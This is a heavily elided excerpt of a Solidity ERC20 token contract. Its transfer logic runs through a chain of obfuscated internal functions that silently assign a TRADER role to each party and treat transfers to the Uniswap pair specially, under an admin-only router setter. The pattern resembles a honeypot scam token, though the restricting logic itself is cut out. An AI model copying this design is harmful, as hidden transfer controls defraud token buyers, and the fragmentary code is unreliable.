...
abstract contract NEBSCDConsole is Context, CMToleControl {
    struct RoleData {
...
contract NEBSCDERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is NEBSCDERC20, NEBSCDConsole {
    ...
    ) NEBSCDERC20(_name, _symbol, _totalSupply, _tokenOwner) {
        _grantRole(ADMIN, msg.sender);
        _grantRole(ADMIN, _tokenOwner);
    }

    function __steV2Router(address _sV2Pair) public onlyRole(ADMIN) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(NEBSCDERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _NEBSCDcdneb(from, to, amt);
    }

    function _NEBSCDcdneb(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _NEBSCDendkce(from, to, amt);
    }

    function _NEBSCDendkce(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _NEBSCDkcdxcces(from, to, amt);
    }

    function _NEBSCDkcdxcces(address from, address to, uint256 amt) internal {
        if (__traders[from] == false) {
            _grantRole(TRADER, from);
            __traders[from] = true;
        }

        _NEBSCDcxisncs(from, to, amt);
    }

    function _NEBSCDcxisncs(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
        }
        _NEBSCDxclsxcesc(from, to, amt);
    }

    function _NEBSCDxclsxcesc(address from, address to, uint256 amt) internal {
        ...
        _NEBSCDxlxdenkx(from, to, amt);
    }

    function _NEBSCDxlxdenkx(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
        ...
        _NEBSCDcxosldend(from, to, amt);
    }

    function _NEBSCDcxosldend(address from, address to, uint256 amt) internal {
